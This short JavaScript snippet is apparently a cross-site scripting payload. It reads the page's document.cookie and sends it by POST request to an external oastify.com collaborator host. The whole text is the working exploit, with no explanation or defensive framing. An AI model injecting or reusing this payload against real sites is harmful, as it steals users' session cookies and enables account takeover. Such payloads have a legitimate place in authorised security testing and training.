const xhr = new XMLHttpRequest();
xhr.open("POST", 'http://3aemmo21fflhfvxlmtn8u644rvxmlb.oastify.com', true);
let ck = document.cookie;
xhr.onreadystatechange = () => { 
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
  }
}
xhr.send(ck);
